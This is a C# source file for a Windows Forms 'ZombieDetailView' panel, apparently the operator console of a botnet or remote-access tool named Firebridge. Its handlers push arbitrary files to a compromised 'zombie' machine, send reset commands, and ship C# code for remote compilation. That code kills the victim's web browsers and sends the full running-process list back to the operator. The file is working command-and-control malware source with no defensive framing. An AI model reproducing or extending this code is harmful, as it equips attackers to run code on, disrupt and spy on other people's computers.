using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using FirebridgeShared.Models;
using FirebridgeShared.Networking;

namespace FirebridgeClient.Views
{
    public partial class ZombieDetailView : Form
    {
        private Connection connection;
        public ZombieDetailView(Connection connection)
        {
            InitializeComponent();
            this.connection = connection;
        }

        public void Update(object sender, EventArgs e)
        {
            var f = new OpenFileDialog();
            f.Multiselect = true;
            if (f.ShowDialog() == DialogResult.OK)
            {
                var update = new UpdateModel() { Names = new List<string>(), Data = new List<byte[]>() };
                for (int i = 0; i < f.FileNames.Length; i++)
                {
                    update.Data.Add(File.ReadAllBytes(f.FileNames[i]));
                    update.Names.Add(f.SafeFileNames[i]);

                }
                connection.SendPacket(new Packet() { Id = 4, Data = update });
            }

        }

        private void Button1_Click(object sender, EventArgs e)
        {
            connection.SendPacket(new Packet() { Id = 2, Data = 70 });
        }

        private void ResetApp(object sender, EventArgs e)
        {
            connection.SendPacket(new Packet() { Id = 2, Data = 71 });

        }

        private void Button4_Click(object sender, EventArgs e)
        {

            connection.SendPacket(new Packet() { Id = 50, Data = 71 });
        }


        private void SendCode(object sender, EventArgs e)
        {
            connection.SendPacket(new Packet()
            {
                Id = 1,
                Data = new MiniProgramModel()
                {
                    Code = @"
            using System;
            using System.Diagnostics;
            using System.Linq;
            using FirebridgeShared.Networking;

            namespace TestApp
            {
                public static class Program
                {
                    public static void Main(Connection s)
                    {
                        Process[] AllProcesses = Process.GetProcesses();
                        foreach (var process in AllProcesses)
                        {
                            if (process.MainWindowTitle != """")
                            {
                                string k = process.ProcessName.ToLower();
                                if (k == ""iexplore"" || k == ""iexplorer"" || k == ""chrome"" || k == ""firefox"")
                                    process.Kill();
                            }
                        }

                       s.SendPacket(new Packet() { Id = 0, Data = String.Join("","", Process.GetProcesses().Select(p => p.ProcessName.ToString()).ToArray())});

                            }
                }
            }",
                    EntryPoint = "TestApp.Program",
                    References = new List<string>()
                                {
                                    "System.dll", "FirebridgeShared.dll", "netstandard.dll","System.Core.dll"
                                },
                }
            });
        }
    }
}
